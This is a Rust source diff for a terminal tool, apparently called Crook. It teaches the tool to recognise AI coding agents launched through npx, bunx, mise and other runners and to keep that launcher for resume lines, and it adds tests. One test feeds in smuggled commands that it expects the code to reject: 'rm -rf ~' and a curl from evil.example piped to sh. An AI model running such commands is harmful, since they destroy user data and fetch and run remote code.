@@ -44,7 +44,10 @@
 //! [`program_of`] reads a pane's command line for the program an agent is
 //! started as, which is the one word of a process the session file keeps, and
 //! [`resume_line`] is what a pane restored from that file is offered to bring
-//! the agent's conversation back.
+//! the agent's conversation back. The program is read past what only runs
+//! it — `env`, `npx`, `mise x` — and [`launch_of`] keeps the package runner
+//! or version manager an agent was found through, because a resume line has
+//! to be run through it as well.
 //!
 //! `--pull-request <url>` beside any status says which pull request the work
 //! is, and the row links to it. A flag on the report rather than a report of
@@ -487,6 +490,11 @@ struct Agent {
     name: &'static str,
     /// What the program calls itself.
     program: &'static str,
+    /// The npm package the agent is published as, which a package runner —
+    /// `npx @google/gemini-cli` — is handed in the program's place, or
+    /// `None` for one that is not published there: aider is a Python
+    /// package.
+    package: Option<&'static str>,
     /// How the fragment is spelled, and where it goes.
     fragment: Fragment,
     /// The option a first prompt goes after when the agent is started on one,
@@ -749,6 +757,7 @@ const AGENTS: &[Agent] = &[
     Agent {
         name: "claude",
         program: "Claude Code",
+        package: Some("@anthropic-ai/claude-code"),
         fragment: Fragment::Hooks {
             file: "~/.claude/settings.json, or a project's .claude/settings.json",
             events: CLAUDE_EVENTS,
@@ -763,6 +772,7 @@ const AGENTS: &[Agent] = &[
     Agent {
         name: "codex",
         program: "Codex CLI",
+        package: Some("@openai/codex"),
         fragment: Fragment::Hooks {
             file: "~/.codex/hooks.json, or a project's .codex/hooks.json",
             events: CODEX_EVENTS,
@@ -778,6 +788,7 @@ permission, and a question the model asks ends its turn as idle.",
     Agent {
         name: "gemini",
         program: "Gemini CLI",
+        package: Some("@google/gemini-cli"),
         fragment: Fragment::Hooks {
             file: "~/.gemini/settings.json, or a project's .gemini/settings.json",
             events: GEMINI_EVENTS,
@@ -793,6 +804,7 @@ model asks ends its turn as idle.",
     Agent {
         name: "copilot",
         program: "GitHub Copilot CLI",
+        package: Some("@github/copilot"),
         fragment: Fragment::Copilot {
             file: "~/.copilot/hooks/crook.json, or a project's .github/hooks/crook.json",
             events: COPILOT_EVENTS,
@@ -805,6 +817,7 @@ model asks ends its turn as idle.",
     Agent {
         name: "opencode",
         program: "OpenCode",
+        package: Some("opencode-ai"),
         fragment: Fragment::Plugin {
             file: "~/.config/opencode/plugins/crook.ts, or a project's .opencode/plugins/crook.ts",
             source: OPENCODE_PLUGIN,
@@ -817,6 +830,7 @@ model asks ends its turn as idle.",
     Agent {
         name: "aider",
         program: "aider",
+        package: None,
         fragment: Fragment::None(
             "aider has no hooks. Its `--notifications-command` runs one command when a turn \
 ends and it waits for you, so `aider --notifications --notifications-command \"BINARY \
@@ -833,50 +847,322 @@ wrapper script that runs `BINARY --agent running` first.",
 /// The known agent a command line starts, by its program's name, or `None`
 /// when the line starts something else.
 ///
-/// The first word only, and only its file name: `claude "fix the login bug"`
-/// and `/opt/homebrew/bin/claude --model opus` are both `claude`. Nothing
-/// after the first word is ever handed on, because what comes after it is
-/// where a person types the prompt, and the answer to this is written into
-/// the session file. A word that names no agent this module knows — `cargo`,
-/// `vim`, a `claudette` — is `None`, so a file never holds the name of a
-/// program Crook would not know how to offer back.
+/// The program's file name: `claude "fix the login bug"` and
+/// `/opt/homebrew/bin/claude --model opus` are both `claude`. Nothing after
+/// it is ever handed on, because what comes after it is where a person
+/// types the prompt, and the answer to this is written into the session
+/// file. A word that names no agent this module knows — `cargo`, `vim`, a
+/// `claudette` — is `None`, so a file never holds the name of a program
+/// Crook would not know how to offer back.
 ///
-/// The word as the shell reads it, quotes and all: `crook tab new` types
+/// The program is read past what only runs it — `env`, `npx`, `mise x` —
+/// the way [`launch_of`] reads it, so `npx @google/gemini-cli` is `gemini`.
+///
+/// The words as the shell reads them, quotes and all: `crook tab new` types
 /// every word of its command in single quotes, so a worker it opens runs
 /// `'codex' 'fix the flaky test'`, and that is `codex` as well.
 pub fn program_of(command: &str) -> Option<&'static str> {
-    let first = first_word(command)?;
-    let file = first.rsplit(['/', '\\']).next().unwrap_or(&first);
-    // Windows' own spellings of the same program: the binary, and the shim
-    // npm installs a Node CLI as.
-    let program = file
-        .strip_suffix(".exe")
-        .or_else(|| file.strip_suffix(".cmd"))
-        .unwrap_or(file);
-    AGENTS
-        .iter()
-        .find(|agent| agent.name == program)
-        .map(|agent| agent.name)
+    launch_of(command).map(|launch| launch.agent)
 }
 
-/// The first word of a command line, the way a shell splits it off: up to
-/// the first space outside quotes, with the quotes taken out — so a path
-/// with a space in it, quoted, is one word. `None` for a line with no word.
+/// How a command line starts a known agent: which one, and the words that
+/// ran it when its own name was not what did.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Launch {
+    /// The agent, by its name in the table: `gemini`.
+    pub agent: &'static str,
+    /// The words that ran the agent in its own name's place —
+    /// `npx @google/gemini-cli`, `mise x node@22 -- claude` — or `None` for
+    /// an agent run by its name.
+    ///
+    /// What a resume line is spelled through: see [`Self::through_launcher`].
+    pub launcher: Option<String>,
+}
+
+impl Launch {
+    /// The launch a session file remembers, when the table answers to it:
+    /// `agent` one of its names, and `launcher` words that [`launch_of`]
+    /// reads back as themselves, starting that agent. A launcher in any
+    /// other shape — another build's, a hand edit's, a command after a `;` —
+    /// comes back as the agent alone, and a name no agent answers to as
+    /// nothing, since what a restored pane is offered comes from the table
+    /// and never from the file.
+    pub fn remembered(agent: &str, launcher: Option<&str>) -> Option<Self> {
+        let agent = AGENTS.iter().find(|known| known.name == agent)?.name;
+        let launcher = launcher.filter(|launcher| {
+            launch_of(launcher).is_some_and(|launch| {
+                launch.agent == agent && launch.launcher.as_deref() == Some(launcher)
+            })
+        });
+        Some(Self {
+            agent,
+            launcher: launcher.map(str::to_owned),
+        })
+    }
+
+    /// `line`, run the way this launch ran its agent: the agent's name at
+    /// its start swapped for the launcher, so that `gemini --resume latest`
+    /// is `npx @google/gemini-cli --resume latest` for a pane that started
+    /// Gemini CLI through `npx`, where there is no `gemini` on `PATH` to
+    /// run.
+    ///
+    /// A line that starts some other way — a person's own, through an alias
+    /// of theirs — says how they want it run, and is left as it is.
+    pub fn through_launcher(&self, line: String) -> String {
+        let Some(launcher) = &self.launcher else {
+            return line;
+        };
+        match line.strip_prefix(self.agent) {
+            Some(rest) if rest.is_empty() || rest.starts_with(char::is_whitespace) => {
+                format!("{launcher}{rest}")
+            }
+            _ => line,
+        }
+    }
+}
+
+/// How `command` starts a known agent, or `None` when it starts something
+/// else — see [`program_of`] for how the program is read.
+///
+/// Read past the words that only run the program. Some are dropped: `env`
+/// and its options, `NAME=value` assignments, `command`, `exec`, `time`,
+/// `nohup` and `nice`. None of them changes where the program is found, and
+/// an assignment is where a person puts an API key, which has no place in a
+/// file anybody with the home directory can read. The others are kept as
+/// the [`Launch::launcher`], because without them the program is not found
+/// at all: a package runner — `npx`, `bunx` or `bun x`, `pnpm dlx` or
+/// `pnpx`, `yarn dlx`, `npm exec` — handed the agent's package, and a
+/// version manager's `mise x … --` or `asdf exec`. Somebody who runs Gemini
+/// CLI the way its own quick start does, `npx @google/gemini-cli`, has no
+/// `gemini` on `PATH` to resume with.
+///
+/// What is kept is rebuilt rather than copied: each program by its name and
+/// not its path, a runner's package without the runner's options — `-y`, a
+/// registry's address — and `mise`'s tools without its own, and only words
+/// that mean the same typed into any shell. Nothing after the agent's
+/// program is ever kept.
+///
+/// An alias is not seen through. The shell reports the line as it was
+/// typed, and `cc` is a word only the shell that defined it can expand.
+pub fn launch_of(command: &str) -> Option<Launch> {
+    let words = words(command);
+    let mut rest = words.as_slice();
+    let mut kept: Vec<&str> = Vec::new();
+    loop {
+        let (word, after) = rest.split_first()?;
+        if is_assignment(word) {
+            rest = after;
+            continue;
+        }
+        let program = program_name(word);
+        let second = after.first().map(String::as_str);
+        rest = match (program, second) {
+            ("env", _) => past_options(after, &["-u", "--unset", "-C", "--chdir", "-S"]),
+            // Says what the name is, and runs nothing.
+            ("command", Some("-v" | "-V")) => return None,
+            ("command" | "nohup", _) => past_options(after, &[]),
+            ("exec", _) => past_options(after, &["-a"]),
+            ("time", _) => past_options(after, &["-f", "--format", "-o", "--output"]),
+            ("nice", _) => past_options(after, &["-n", "--adjustment"]),
+            ("mise", Some(verb @ ("x" | "exec"))) => {
+                let (tools, command) = mise_tools(&after[1..])?;
+                // A tool that would need quoting leaves `mise` out of the
+                // launcher altogether: the launcher is typed back as it is,
+                // into whatever shell the pane has.
+                if tools.iter().all(|tool| plain(tool)) {
+                    kept.extend(["mise", verb]);
+                    kept.extend(tools);
+                    kept.push("--");
+                }
+                command
+            }
+            ("asdf", Some("exec")) => {
+                kept.extend(["asdf", "exec"]);
+                &after[1..]
+            }
+            ("npx" | "bunx" | "pnpx", _) => return package_run(kept, &[program], after),
+            ("bun", Some(verb @ "x")) | ("pnpm" | "yarn", Some(verb @ "dlx")) => {
+                return package_run(kept, &[program, verb], &after[1..]);
+            }
+            // The one runner that reads the options after the package as
+            // its own, unless a `--` comes first.
+            ("npm", Some(verb @ ("exec" | "x"))) => {
+                return package_run(kept, &[program, verb, "--"], &after[1..]);
+            }
+            _ => {
+                let agent = AGENTS.iter().find(|agent| agent.name == program)?;
+                let launcher = (!kept.is_empty()).then(|| {
+                    kept.push(agent.name);
+                    kept.join(" ")
+                });
+                return Some(Launch {
+                    agent: agent.name,
+                    launcher,
+                });
+            }
+        };
+    }
+}
+
+/// The agent a package runner is asked to run, from the words after the
+/// runner's own: the package it was handed, or the program it was told to
+/// run out of a `--package`, which has to be that agent's own package.
+///
+/// The launcher is what was `kept` before the runner, the runner, and the
+/// package as it was asked for — `@google/gemini-cli@0.9.0` stays that
+/// version — unless the request needs quoting, when it is the package by its
+/// name alone.
+fn package_run<'w>(
+    mut kept: Vec<&'w str>,
+    runner: &[&'w str],
+    words: &'w [String],
+) -> Option<Launch> {
+    let mut asked = None;
+    let mut rest = words;
+    let target = loop {
+        let (word, after) = rest.split_first()?;
+        rest = after;
+        if word == "--" {
+            break rest.first()?;
+        }
+        if let Some(package) = word.strip_prefix("--package=") {
+            asked = Some(package);
+        } else if word == "-p" || word == "--package" {
+            let (package, after) = rest.split_first()?;
+            asked = Some(package.as_str());
+            rest = after;
+        } else if !word.starts_with('-') {
+            break word;
+        }
+    };
+    let (agent, asked) = match asked {
+        None => {
+            let name = package_name(target);
+            let agent = AGENTS.iter().find(|agent| agent.package == Some(name))?;
+            (agent, target.as_str())
+        }
+        Some(asked) => {
+            let program = program_name(target);
+            let agent = AGENTS.iter().find(|agent| agent.name == program)?;
+            (agent.package == Some(package_name(asked))).then_some((agent, asked))?
+        }
+    };
+    kept.extend(runner);
+    kept.push(if plain(asked) { asked } else { agent.package? });
+    Some(Launch {
+        agent: agent.name,
+        launcher: Some(kept.join(" ")),
+    })
+}
+
+/// A package's name out of what a runner was asked for, with the version
+/// after it taken off: `opencode-ai@latest` is `opencode-ai`, and
+/// `@google/gemini-cli@0.9.0` is `@google/gemini-cli`, the `@` of its scope
+/// being no version's.
+fn package_name(asked: &str) -> &str {
+    let version = match asked.strip_prefix('@') {
+        Some(scoped) => scoped.find('@').map(|at| at + 1),
+        None => asked.find('@'),
+    };
+    version.map_or(asked, |at| &asked[..at])
+}
+
+/// The tools `mise x` was given and the command after its `--`, or `None`
+/// for a `mise x` with no `--`, which runs no command of its own.
+///
+/// `mise`'s own options are left out — `-C` names a directory, which is
+/// nothing the file should hold — and only the tools are kept.
+fn mise_tools(words: &[String]) -> Option<(Vec<&str>, &[String])> {
+    let end = words.iter().position(|word| word == "--")?;
+    let mut tools = Vec::new();
+    let mut options = words[..end].iter();
+    while let Some(word) = options.next() {
+        if ["-C", "--cd", "-j", "--jobs"].contains(&word.as_str()) {
+            options.next();
+        } else if !word.starts_with('-') {
+            tools.push(word.as_str());
+        }
+    }
+    Some((tools, &words[end + 1..]))
+}
+
+/// `words` past a wrapper's own options: every word up to the first that
+/// does not start with `-`, the one after each option in `valued` with it,
+/// and a `--` that ends them.
+fn past_options<'w>(words: &'w [String], valued: &[&str]) -> &'w [String] {
+    let mut rest = words;
+    while let Some((word, after)) = rest.split_first() {
+        if word == "--" {
+            return after;
+        }
+        if !word.starts_with('-') {
+            break;
+        }
+        rest = if valued.contains(&word.as_str()) {
+            after.get(1..).unwrap_or_default()
+        } else {
+            after
+        };
+    }
+    rest
+}
+
+/// Whether a word sets a variable for the command after it: `NAME=value`,
+/// with a name a shell would take as one.
+fn is_assignment(word: &str) -> bool {
+    word.split_once('=').is_some_and(|(name, _)| {
+        let mut characters = name.chars();
+        characters
+            .next()
+            .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
+            && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
+    })
+}
+
+/// Whether a word reads as itself in every shell a pane can have, with no
+/// quotes around it — so that the launcher it goes into can be typed back
+/// as it is.
+fn plain(word: &str) -> bool {
+    !word.is_empty()
+        && word
+            .chars()
+            .all(|character| character.is_ascii_alphanumeric() || "@+-._/:".contains(character))
+}
+
+/// A word's program, by its file name: `/opt/homebrew/bin/claude` is
+/// `claude`.
+fn program_name(word: &str) -> &str {
+    let file = word.rsplit(['/', '\\']).next().unwrap_or(word);
+    // Windows' own spellings of the same program: the binary, and the shim
+    // npm installs a Node CLI as.
+    file.strip_suffix(".exe")
+        .or_else(|| file.strip_suffix(".cmd"))
+        .unwrap_or(file)
+}
+
+/// The words of a command line, the way a shell splits them: at spaces
+/// outside quotes, with the quotes taken out — so a path with a space in it,
+/// quoted, is one word, and `''` is a word with nothing in it.
 ///
 /// Quotes only. A backslash stays what it is, since in a Windows path it is
 /// the separator and not an escape; no agent's name has one to escape.
-fn first_word(command: &str) -> Option<String> {
-    let mut word = String::new();
+fn words(command: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut word: Option<String> = None;
     let mut open = None;
-    for character in command.trim_start().chars() {
+    for character in command.chars() {
         match (open, character) {
-            (None, character) if character.is_whitespace() => break,
-            (None, '\'' | '"') => open = Some(character),
+            (None, character) if character.is_whitespace() => words.extend(word.take()),
+            (None, '\'' | '"') => {
+                open = Some(character);
+                word.get_or_insert_default();
+            }
             (Some(quote), character) if character == quote => open = None,
-            (_, character) => word.push(character),
+            (_, character) => word.get_or_insert_default().push(character),
         }
     }
-    (!word.is_empty()).then_some(word)
+    words.extend(word);
+    words
 }
 
 /// The line that resumes `program`'s conversation in the directory it is
@@ -2145,6 +2431,338 @@ its `hooks` should be\n{}",
             "./claude-notes.sh",
         ] {
             assert_eq!(None, program_of(command), "{command:?}");
+        }
+    }
+
+    #[test]
+    fn an_agent_run_through_a_package_runner_is_named_by_its_package() {
+        // Gemini CLI's own quick start, and each package runner's spelling
+        // of the same thing.
+        for command in [
+            "npx @google/gemini-cli",
+            "npx -y @google/gemini-cli -i 'port the tab bar'",
+            "npx --yes @google/gemini-cli@latest",
+            "npx -p @google/gemini-cli gemini",
+            "npx --package=@google/gemini-cli@0.9.0 gemini --resume latest",
+            "bunx @google/gemini-cli",
+            "bun x @google/gemini-cli",
+            "pnpm dlx @google/gemini-cli",
+            "pnpx @google/gemini-cli",
+            "yarn dlx @google/gemini-cli",
+            "npm exec -- @google/gemini-cli",
+            "npm x @google/gemini-cli",
+            "/usr/local/bin/npx @google/gemini-cli",
+            r"C:\nvm\v22\npx.cmd @google/gemini-cli",
+            // The line `crook tab new -- npx @google/gemini-cli` types.
+            "'npx' '@google/gemini-cli' 'fix the flaky test'",
+        ] {
+            assert_eq!(Some("gemini"), program_of(command), "{command:?}");
+        }
+        for (command, agent) in [
+            ("npx @anthropic-ai/claude-code", "claude"),
+            ("bunx @openai/codex resume --last", "codex"),
+            ("pnpm dlx @github/copilot", "copilot"),
+            ("npx opencode-ai@latest", "opencode"),
+        ] {
+            assert_eq!(Some(agent), program_of(command), "{command:?}");
+        }
+    }
+
+    #[test]
+    fn an_agent_behind_assignments_and_wrappers_is_named_all_the_same() {
+        for command in [
+            "env claude",
+            "/usr/bin/env claude",
+            "env ANTHROPIC_MODEL=opus claude",
+            "env -i -u TERM --unset=LANG HOME=/home/me claude",
+            "env -C /tmp claude",
+            "env -- claude",
+            "ANTHROPIC_MODEL=opus DEBUG= claude --continue",
+            "command claude",
+            "command -p claude",
+            "exec claude",
+            "exec -a agent claude",
+            "time claude",
+            "time -p claude",
+            "/usr/bin/time -f %e -o /tmp/took claude",
+            "nohup claude",
+            "nice claude",
+            "nice -n 10 claude",
+            "nice --adjustment=5 claude",
+            "nohup env FOO=1 nice -n 5 time claude 'fix the bug'",
+            "'env' 'FOO=1' 'claude'",
+        ] {
+            assert_eq!(Some("claude"), program_of(command), "{command:?}");
+        }
+        assert_eq!(
+            Some("gemini"),
+            program_of("env GEMINI_API_KEY=key npx @google/gemini-cli")
+        );
+    }
+
+    #[test]
+    fn an_agent_run_through_a_version_manager_is_named_all_the_same() {
+        for (command, agent) in [
+            ("mise x -- claude", "claude"),
+            ("mise x node@22 -- claude --model opus", "claude"),
+            ("mise exec node@22 python@3.12 -- codex", "codex"),
+            ("mise x -C /work/repo node@22 -- codex", "codex"),
+            ("mise x node@22 -- npx @google/gemini-cli", "gemini"),
+            ("mise x node@22 -- env FOO=1 copilot", "copilot"),
+            ("asdf exec claude", "claude"),
+            ("asdf exec npx @openai/codex", "codex"),
+        ] {
+            assert_eq!(Some(agent), program_of(command), "{command:?}");
+        }
+    }
+
+    #[test]
+    fn a_launcher_that_starts_no_known_agent_names_nothing() {
+        for command in [
+            "npx",
+            "npx cowsay claude",
+            "npx claude",
+            "npx @google/gemini-cli-core",
+            "npx @anthropic-ai/claude-code-router",
+            "npx -p @google/gemini-cli codex",
+            "npx -p cowsay claude",
+            "npm install -g @anthropic-ai/claude-code",
+            "pnpm add @google/gemini-cli",
+            "yarn add @openai/codex",
+            "bun run claude",
+            "env",
+            "env FOO=1",
+            "FOO=1",
+            "env echo claude",
+            "command -v claude",
+            "command -V claude",
+            "time cargo test",
+            "nohup ./claude-notes.sh",
+            "mise x claude",
+            "mise install claude",
+            "mise x node@22 -- npm test",
+            "asdf install nodejs",
+            "'' claude",
+        ] {
+            assert_eq!(None, program_of(command), "{command:?}");
+        }
+    }
+
+    #[test]
+    fn every_agent_published_to_npm_is_named_by_its_package_through_npx() {
+        // The names npm has them under, each with the one program it
+        // installs being the agent's own name.
+        let packages: Vec<_> = AGENTS
+            .iter()
+            .filter_map(|agent| Some((agent.name, agent.package?)))
+            .collect();
+        assert_eq!(
+            packages,
+            [
+                ("claude", "@anthropic-ai/claude-code"),
+                ("codex", "@openai/codex"),
+                ("gemini", "@google/gemini-cli"),
+                ("copilot", "@github/copilot"),
+                ("opencode", "opencode-ai"),
+            ]
+        );
+        for (agent, package) in packages {
+            assert_eq!(Some(agent), program_of(&format!("npx {package}")));
+        }
+    }
+
+    #[test]
+    fn the_launcher_keeps_what_finds_the_program_and_nothing_else() {
+        for (command, launcher) in [
+            // The prompt and the runner's own options stay out of it.
+            (
+                "npx -y @google/gemini-cli -i 'port the tab bar'",
+                "npx @google/gemini-cli",
+            ),
+            (
+                "npx --registry=https://me:token@npm.example @google/gemini-cli",
+                "npx @google/gemini-cli",
+            ),
+            // An assignment is where an API key goes.
+            (
+                "GEMINI_API_KEY=secret npx @google/gemini-cli",
+                "npx @google/gemini-cli",
+            ),
+            (
+                "env GEMINI_API_KEY=secret nohup npx @google/gemini-cli",
+                "npx @google/gemini-cli",
+            ),
+            // The version asked for is the one resumed with.
+            (
+                "bunx @openai/codex@0.98.0 'fix the flaky test'",
+                "bunx @openai/codex@0.98.0",
+            ),
+            ("bun x @openai/codex", "bun x @openai/codex"),
+            ("pnpm dlx @github/copilot", "pnpm dlx @github/copilot"),
+            ("pnpx @github/copilot", "pnpx @github/copilot"),
+            ("yarn dlx opencode-ai", "yarn dlx opencode-ai"),
+            // `npm exec` hands the options after its `--` on, and takes
+            // the ones before it as its own.
+            (
+                "npm exec -- @anthropic-ai/claude-code",
+                "npm exec -- @anthropic-ai/claude-code",
+            ),
+            (
+                "npm x @anthropic-ai/claude-code",
+                "npm x -- @anthropic-ai/claude-code",
+            ),
+            // The runner by its name, not where it was.
+            (
+                "/opt/homebrew/bin/npx @anthropic-ai/claude-code",
+                "npx @anthropic-ai/claude-code",
+            ),
+            (r"C:\nvm\v22\npx.cmd @github/copilot", "npx @github/copilot"),
+            // A program out of a package is the package.
+            (
+                "npx --package=@google/gemini-cli@0.9.0 gemini -i x",
+                "npx @google/gemini-cli@0.9.0",
+            ),
+            // A version that needs quoting is the package alone.
+            ("npx '@google/gemini-cli@>=0.9'", "npx @google/gemini-cli"),
+            // Quoted, as `crook tab new` types it.
+            (
+                "'npx' '@google/gemini-cli' 'fix the flaky test'",
+                "npx @google/gemini-cli",
+            ),
+            // A version manager's tools, and none of its options.
+            (
+                "mise x -C /work/repo node@22 -- claude --model opus",
+                "mise x node@22 -- claude",
+            ),
+            ("mise exec -- /usr/local/bin/codex", "mise exec -- codex"),
+            (
+                "mise x node@22 -- env FOO=1 npx @google/gemini-cli",
+                "mise x node@22 -- npx @google/gemini-cli",
+            ),
+            ("asdf exec claude", "asdf exec claude"),
+        ] {
+            let launch = launch_of(command).unwrap_or_else(|| panic!("{command:?}"));
+            assert_eq!(Some(launcher), launch.launcher.as_deref(), "{command:?}");
+        }
+
+        // Run by its name, past only what is dropped: nothing to keep.
+        for command in [
+            "claude",
+            "/opt/homebrew/bin/claude --model opus",
+            "env ANTHROPIC_API_KEY=secret claude",
+            "nohup nice -n 5 claude",
+            "exec claude",
+        ] {
+            assert_eq!(
+                Some(Launch {
+                    agent: "claude",
+                    launcher: None
+                }),
+                launch_of(command),
+                "{command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_resume_line_runs_through_the_launcher_its_agent_was_started_with() {
+        let launch = |command| launch_of(command).expect("a launch");
+        assert_eq!(
+            "npx @google/gemini-cli --resume latest",
+            launch("npx @google/gemini-cli").through_launcher("gemini --resume latest".to_owned())
+        );
+        assert_eq!(
+            "mise x node@22 -- bunx @openai/codex resume --last",
+            launch("mise x node@22 -- bunx @openai/codex")
+                .through_launcher("codex resume --last".to_owned())
+        );
+        let claude = launch("mise x node@22 -- claude");
+        assert_eq!(
+            "mise x node@22 -- claude --continue",
+            claude.through_launcher("claude --continue".to_owned())
+        );
+        // A person's own line that starts some other way is how they want
+        // it run.
+        for line in ["cc --continue", "claudette --continue"] {
+            assert_eq!(line, claude.through_launcher(line.to_owned()));
+        }
+        // An agent run by its name is resumed by it.
+        assert_eq!(
+            "claude --continue",
+            launch("env FOO=1 claude").through_launcher("claude --continue".to_owned())
+        );
+    }
+
+    #[test]
+    fn every_resume_line_through_every_launcher_reads_back_as_the_launch_it_resumes() {
+        // Running the line a restore offered is a pane running that agent
+        // again; a line read back as another launch would be saved as that
+        // one, and the restart after it would offer something else.
+        for agent in AGENTS {
+            let Some(package) = agent.package else {
+                continue;
+            };
+            for runner in [
+                "npx",
+                "bunx",
+                "bun x",
+                "pnpm dlx",
+                "pnpx",
+                "yarn dlx",
+                "npm exec --",
+                "mise x node@22 -- npx",
+            ] {
+                let launch = launch_of(&format!("{runner} {package}")).expect(runner);
+                assert_eq!(agent.name, launch.agent, "{runner} {package}");
+                for line in [agent.last, agent.pick].into_iter().flatten() {
+                    let line = launch.through_launcher(line.to_owned());
+                    assert_eq!(Some(&launch), launch_of(&line).as_ref(), "{line}");
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn a_remembered_launcher_comes_back_only_in_a_shape_a_launch_reads_back() {
+        for command in [
+            "npx @google/gemini-cli",
+            "bunx @google/gemini-cli@0.9.0",
+            "npm exec -- @google/gemini-cli",
+            "mise x node@22 -- gemini",
+            "gemini",
+        ] {
+            let launch = launch_of(command).expect(command);
+            assert_eq!(
+                Some(&launch),
+                Launch::remembered(launch.agent, launch.launcher.as_deref()).as_ref(),
+                "{command:?} did not survive the file"
+            );
+        }
+
+        // Anything else is the agent alone: what a restored pane is offered
+        // comes from the table, never from the file.
+        for launcher in [
+            "npx @google/gemini-cli; rm -rf ~",
+            "rm -rf ~; npx @google/gemini-cli",
+            "npx @google/gemini-cli && curl https://evil.example | sh",
+            "env GEMINI_API_KEY=secret npx @google/gemini-cli",
+            "npx -y @google/gemini-cli",
+            "npx @openai/codex",
+            "gemini",
+            "",
+        ] {
+            assert_eq!(
+                Some(Launch {
+                    agent: "gemini",
+                    launcher: None
+                }),
+                Launch::remembered("gemini", Some(launcher)),
+                "{launcher:?}"
+            );
+        }
+        // And a name no agent answers to is nothing at all.
+        for agent in ["rm -rf ~", "npx @google/gemini-cli", "/usr/bin/claude", ""] {
+            assert_eq!(None, Launch::remembered(agent, None), "{agent:?}");
         }
     }
 
